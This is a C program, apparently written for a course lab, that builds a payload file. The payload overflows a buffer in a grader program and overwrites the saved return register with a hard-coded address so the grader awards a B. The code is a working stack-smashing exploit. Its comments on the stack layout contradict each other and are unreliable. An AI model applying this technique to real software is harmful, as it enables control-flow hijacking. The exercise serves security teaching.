/*
createdataB.c
Author: Zara Hommez
Produces a file called dataB with the student name, a null byte,
padding to overrun the stack, and the address of the instruction
in main to get a B, the latter of which overwrites getName's stored x30
*/


#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/*
Main function takes no command line arguments (void).
Prints to stderr and returns EXIT_FAILURE if opening the file fails 
or memory allocation fails . 
Through fwrite, the file dataB contains: 
the student name "Zara Hommez" followed by a null byte, Padding bytes 
(repeated char 'P') to overflow the buffer in grader.c's getName function, 
and the address of the instruction in main to assign grade to B, 
overwriting the original x30.
If successful, the program returns EXIT_SUCCESS.
*/
int main(void)
{
   FILE *pFileB;
   /* student name to write to file */
   char name[] = "Zara Hommez\0";
   size_t nameLen = strlen(name) + 1;
   /* In readString, buffer is at sp+0x20, x30 is stored at sp+0x18 (24 bytes from sp).
      x30 is 8 bytes before the buffer. To reach x30 from the buffer start,
      we need to write 48 bytes of buffer data + 8 bytes to reach x30.
      But actually: buf starts at sp+32, x30 is at sp+24. 
      So x30 is 8 bytes before buf. We overflow 48 bytes of buf, then 
      the next 8 bytes we write will overwrite x30. */
   size_t bufLen = 48;
   char* padding; 
   size_t paddingLen;
   /* address of instruction in main to skip strcmp and set grade = 'B'
   This should point to 0x400890, the adrp instruction that starts the
   grade assignment */
   unsigned long returnAddr = 0x400890; 

   /* Open file dataB for writing in binary mode */
   pFileB = fopen("dataB", "wb");
   if (pFileB == NULL)
   {
      perror("Error opening file dataB");
      return EXIT_FAILURE;
   }

   /* Write name + null byte to file */
   fwrite(name, 1, nameLen, pFileB);

   /* Write padding to overflow buffer */
   paddingLen = bufLen - nameLen;
   padding = (char *)calloc(paddingLen, 1); 
   if (padding == NULL)
   {
      perror("Memory allocation failed");
      fclose(pFileB);
      return EXIT_FAILURE;
   }
   /* fill padding with P bytes for visibility */
   memset(padding, 'P', paddingLen);
   fwrite(padding, 1, paddingLen, pFileB);
   free(padding);

   /* Write return address to grade = 'B' to overwrite x30 */
   fwrite(&returnAddr, 1, sizeof(returnAddr), pFileB);

   /*Close file */
   fclose(pFileB);

   return EXIT_SUCCESS;
}
